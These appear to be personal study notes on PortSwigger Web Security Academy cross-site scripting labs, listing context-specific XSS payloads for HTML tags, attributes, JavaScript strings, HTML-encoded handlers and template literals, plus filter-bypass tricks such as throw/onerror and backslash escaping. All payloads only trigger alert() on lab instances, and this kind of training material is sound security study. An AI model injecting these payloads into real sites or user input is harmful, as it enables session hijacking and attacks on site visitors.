# Cross-site scripting contexts

When testing for [reflected](https://portswigger.net/web-security/cross-site-scripting/reflected) and [stored](https://portswigger.net/web-security/cross-site-scripting/stored) XSS, a key task is to identify the XSS context:

- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.

---

#### Note
We have built a comprehensive [**XSS cheat sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) to help testing web applications and filters. You can filter by events and tags and see which vectors require user interaction. 
The cheat sheet also contains AngularJS sandbox escapes and many other sections to help with XSS research.

----
# XSS between HTML tags

### [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

### [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

### [Reflected XSS with event handlers and `href` attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked)
```html
<svg> <a> <animate attributeName="href" values="javascript:alert('Pinged!')"/>  <text x=0 y=0>click<text></a> </svg>
```

### [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
```html
<svg> <circle><animateTransform onbegin='alert(1)'></cricle> </svg>
```


----
# XSS in HTML tag attributes

```html
"><script>alert(document.domain)</script>
```


This payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. 

Finally, it adds `x="` to gracefully repair the following markup.
```html
" autofocus onfocus=alert(document.domain) x="
```

### [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

### [Stored XSS into anchor `href` attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

### [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)
![[Pasted image 20250224150928.png]]



---
# XSS into JavaScript

## Terminating the existing script
In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. 

For example, if the XSS context is as follows:
```html
<script>
...
var input = 'controllable data here';
...
</script>
```

then you can use the following payload to break out of the existing JavaScript and execute your own:
```html
</script><img src=1 onerror=alert(document.domain)>
```
The reason this works is that the browser first performs HTML parsing to identify the page elements including blocks of script, and only later performs JavaScript parsing to understand and execute the embedded scripts. 
The above payload leaves the original script broken, with an unterminated string literal. 
But that doesn't prevent the subsequent script being parsed and executed in the normal way.


### [Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped) 
```html
</script><script>alert(1)</script>
```

---
# XSS into JavaScript
In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. 
It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.

Some useful ways of breaking out of a string literal are:
```
'-alert(document.domain)-'
';alert(document.domain)//
```

### [Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
```
';alert(1);'
```
```
'-alert(1)-'
```


Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. 
A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. 
In this situation, applications ==often make the mistake of failing to escape the backslash character itself==. 
This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.

For example, suppose that the input:
```
';alert(document.domain)//
```
gets converted to:
```
\';alert(document.domain)//
```

You can now use the alternative payload:
```
\';alert(document.domain)//
```
which gets converted to:
```
\\';alert(document.domain)//
```
Here, the first backslash means that the second backslash is interpreted literally, and not as a special character.


### [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escape](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
My solution:
```js
\';alert(1);//
```
I used `//` to comment the rest of the line.

Community solution
```js
\'-alert(1)//
```


Some websites make XSS more difficult by restricting which characters you are allowed to use. 
This can be on the website level or by deploying a WAF that prevents your requests from ever reaching the website. 
In these situations, you need to [experiment](https://translate.google.com/?sl=en&tl=ar&text=experiment&op=translate) with other ways of calling functions which bypass these security measures. 
One way of doing this is to use the `throw` statement with an exception handler. 
This enables you to pass arguments to a function without using parentheses. 
The following code assigns the `alert()` function to the global exception handler and the `throw` statement passes the `1` to the exception handler (in this case `alert`). 
The end result is that the `alert()` function is called with `1` as an argument.
```js
onerror=alert;throw 1
```
There are multiple ways of using this technique to call [functions without parentheses](https://portswigger.net/research/xss-without-parentheses-and-semi-colons).

The `onerror` handler is called every time a JavaScript exception is created, and the `throw` statement allows you to create a custom exception containing an expression which is sent to the `onerror` handler. 
Because `throw` is a statement, you usually need to follow the `onerror` assignment with a semi-colon in order to begin a new statement and not form an expression.
It must be possible to adapt this technique to execute a function without a semi-colon. 
The first way is pretty straightforward: you can use curly braces to form a block statement in which you have your `onerror` assignment. 
After the block statement you can use `throw` without a semi-colon (or new line):
```js
<script>{onerror=alert}throw 1337</script>
```
![[Pasted image 20250225094537.png]]


### [Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked)
[Solution](https://youtu.be/bCpBD--GCtQ?feature=shared)
```http
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
```
Decoded version:
```http
https://YOUR-LAB-ID.web-security-academy.net/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```
Most important part:
```http
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

**`throw`**:
```
throw 1, 2;
```
This line will throw exception only with the last parameter (`2`).
But the other parameters will be executed.
```
let v=1;
throw v=2, v;
```
Will throw exception with value `2`.

The way of spoofing space in URL is `/**/` 

**`onerror`**:
Is the java-script error handler.
```
onerror=alert
```
That cause when any time `onerror` even handler is triggered `alert` function will be called. 


```js
throw onerror=alert,1337
```
When any error happened `alert` function will be called with `1337` parameter. 

**On line function on java-script**:
```
let x = () => { throw onerror=alert,1337; }
```
But we can not use `()` in URL in this case so we have to use argument like this:
```
let x = v => { throw onerror=alert,1337; }
```

Override the `toString` method:
```
let x = v => { throw onerror=alert,1337; }
toString=x
```

`toString` will be called when we try to concatenate two strings like:
```js
window+""
```

**Tricky java-script**:
```js
function bad(a, b){
	return a+b;
}

let x = 10;

console.log(bad(1, 2, x=20))

console.log(x) // will print 20 
```
Unless the syntax is true the extra parameters will be executed even that is very bad behavior.



----
# Making use of HTML-encoding

When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.

==**When the browser has parsed out the HTML tags and attributes within a response, it will perform HTML-decoding of tag attribute values before they are processed any further**==. 
==If the server-side application blocks or sanitizes certain characters that are needed for a successful XSS exploit, you can often bypass the input validation by HTML-encoding those characters==.

For example, if the XSS context is as follows:
```html
<a href="#" onclick="... var input='controllable data here'; ...">
```
and the application blocks or escapes single quote characters, you can use the following payload to break out of the JavaScript string and execute your own script:
```js
&apos;-alert(document.domain)-&apos;
```
The `&apos;` sequence is an HTML entity representing an apostrophe or single quote. 
Because the browser HTML-decodes the value of the `onclick` attribute before the JavaScript is interpreted, the entities are decoded as quotes, which become string delimiters, and so the attack succeeds.



### [Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
```
http://foo?&apos;&apos;-alert(1)-&apos;&apos;
```


---
# XSS in JavaScript template literals

JavaScript template literals are string literals that allow embedded JavaScript expressions. 

The embedded expressions are evaluated and are normally concatenated into the surrounding text. 

Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax.

For example, the following script will print a welcome message that includes the user's display name:
```js
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```



### [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
search bar
```
${alert()}
```




